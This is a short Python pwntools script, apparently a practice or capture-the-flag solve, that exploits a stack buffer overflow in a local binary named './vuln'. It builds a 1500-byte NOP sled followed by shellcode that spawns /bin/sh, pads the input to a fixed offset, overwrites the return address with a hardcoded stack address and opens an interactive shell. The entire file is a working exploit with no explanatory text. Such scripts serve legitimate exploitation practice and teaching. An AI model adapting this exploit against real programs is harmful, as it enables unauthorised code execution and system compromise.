#!/usr/bin/env python
from pwn import *

context.binary = "./vuln"

addr = 0x7fffffffcce0 + 500
# 0x7fffffffcdc0
offset = 0x800

io = process("./vuln")
# gdb.attach(io)

# execve("/bin/sh", {"/bin/sh", NULL}, NULL);
print(shellcraft.sh())
shellcode = asm("NOP") * 1500 + asm(shellcraft.sh())
print(len(shellcode))

payload = shellcode
payload += (offset + 8 - len(shellcode)) * b'A'
payload += pack(addr)

io.send(payload)
io.interactive()



